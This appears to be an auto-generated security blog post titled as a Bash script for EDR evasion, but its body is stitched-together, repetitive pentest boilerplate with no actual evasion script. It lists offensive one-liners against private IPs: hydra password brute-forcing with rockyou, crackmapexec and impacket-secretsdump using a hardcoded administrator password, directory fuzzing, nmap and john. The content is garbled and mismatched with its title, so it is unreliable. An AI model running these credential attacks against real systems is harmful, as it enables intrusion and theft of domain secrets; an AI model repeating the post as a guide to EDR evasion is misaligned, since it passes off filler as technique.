---
TitleSEO: "EDR Evasion Techniques in Bash | ZureFX"
TitlePost: "EDR Evasion Techniques — Bash"
Author: "ZureFX"
Description: "A Bash script for edr evasion techniques. Built for security research and automation."
Keywords: "tool, automation, script, go, rust, bash"
URL: "https://zurefx.github.io/scripting/script-edr-evasion-techniques-128.html"
URL_IMAGES: ""
Date: "2025-02-05"
Tags: "Tool, Automation, Script, Go, Rust, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-edr-evasion-techniques-128"
Permalink: "/scripting/script-edr-evasion-techniques-128.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `enum4linux`
- `impacket`
- `nikto`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

```bash
gobuster dir -u http://10.109.210.4/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.90.214 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.64.252.247 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.52.20
nmap -sCV -p27017,1521,22 10.107.247.103 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.161.140 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.238.155/FUZZ
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.75.118.66 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 24.41s
```
